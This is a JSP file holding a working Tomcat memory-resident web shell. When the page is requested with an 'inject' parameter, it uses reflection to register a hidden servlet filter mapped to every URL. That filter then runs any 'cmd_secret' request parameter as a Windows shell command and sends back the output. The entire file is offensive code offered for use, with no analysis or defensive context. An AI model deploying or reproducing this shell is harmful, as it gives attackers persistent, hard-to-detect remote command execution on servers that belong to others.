<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.deploy.FilterDef" %>
<%@ page import="org.apache.catalina.deploy.FilterMap" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>

<%
    class FilterShell implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
            System.out.println("Filter initialized!!");
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            try {
                if (servletRequest.getParameter("cmd_secret") != null) {
                    System.out.println("Filter doFilter!!");
                    Process ps = Runtime.getRuntime().exec("cmd.exe /c " + servletRequest.getParameter("cmd_secret"));
                    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
                    ServletOutputStream out = servletResponse.getOutputStream();

                    String s = null;
                    String output = "";
                    while ((s = br.readLine()) != null) {
                        output += s + "\n";
                    }
                    out.print(output);
                    out.flush();
                    out.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            filterChain.doFilter(servletRequest, servletResponse);
        }

        @Override
        public void destroy() {
            System.out.println("Filter destroy!!");
        }
    }

%>

<%
    if (request.getParameter("inject") != null) {
        // get StandardContext
        ServletContext servletCtx = request.getServletContext();
        ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) servletCtx;
        Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
        appCtxFacadeField.setAccessible(true);
        ApplicationContext appCtx = (ApplicationContext) appCtxFacadeField.get(appCtxFacade);
        Field appCtxField = ApplicationContext.class.getDeclaredField("context");
        appCtxField.setAccessible(true);
        StandardContext stdCtx = (StandardContext) appCtxField.get(appCtx);

        // add FilterDef to StandardContext
        FilterShell FilterShell = new FilterShell();
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterClass("FilterShell");
        filterDef.setFilterName(FilterShell.getClass().getName());
        filterDef.setFilter(FilterShell);
        stdCtx.addFilterDef(filterDef);
        // regenerate filterConfig
        stdCtx.filterStart();

        // add FilterMap to StandardContext
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(FilterShell.getClass().getName());
        filterMap.setDispatcher("REQUEST");
        filterMap.addURLPattern("/*");
        stdCtx.addFilterMap(filterMap);

        response.getWriter().println("Shell injected!!");
    }
%>
